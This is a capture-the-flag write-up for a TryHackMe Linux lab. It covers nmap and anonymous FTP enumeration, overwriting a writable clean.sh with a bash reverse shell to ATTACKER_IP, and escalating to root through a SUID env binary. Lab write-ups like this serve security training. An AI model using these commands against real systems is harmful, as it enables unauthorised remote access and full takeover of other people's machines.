**Target IP:** 10.81.191.77  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**OS:** Linux  

---

# Enumeration

## Host Discovery
The first step is to verify that the target machine is reachable.
```bash
ping -c 3 10.81.191.77
```

---

## nmap scan 
Perform a full port scan with service and version detection.
```bash
nmap -Pn -n -p- -sVC --min-rate 3000 10.81.191.77 -oN scan.txt
```
🧾 Results Summary:

• FTP (21) → Anonymous login enabled 

• SSH (22) → OpenSSH 7.6p1

• SMB (139, 445) → Samba share accessible as guest

---

## FTP enumeration
Loging as anonymous credentials:
```bash
ftp 10.81.191.77
```
Credentials:

• Username: anonymous

• Password: anonymous


**A writable directory was found containing several files:**

• clean.sh

• other script files

**Download them to the attacker machine:**
```bash
get clean.sh
```
The files did not contain useful information, so we moved on to SMB enumeration.

--- 

## Inistial Foothold
**The file `clean.sh` has execute permissions so lets create a malicious reverse shell script.**
```bash
echo '#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/8090 0>&1' > clean.sh
```
*Start a listener:*
```bash
nc -lnvp 8090
```

*Upload the file*
```bash
put clean.sh
```

**After a short wait, a reverse shell is received.** 

- Get the user flag:

```bash
cat user.txt
```

## Privilege Escalation

**SUID enumeration**
```bash
find / -perm -4000 -type f 2>/dev/null 
```

**Interesting binary found:**
```bash
/usr/bin/env
```
**According to GTFOBins, env can be abused to spawn a root shell:**
```bash
/usr/bin/env /bin/sh -p
```

**We get root privileges boooo!**

- Get the root flag:

```bash
cat /root/root.txt
```


## Conclusion

This machine was vulnerable due to:

• Anonymous FTP access with write permissions

• Misconfigured SUID binary (env)



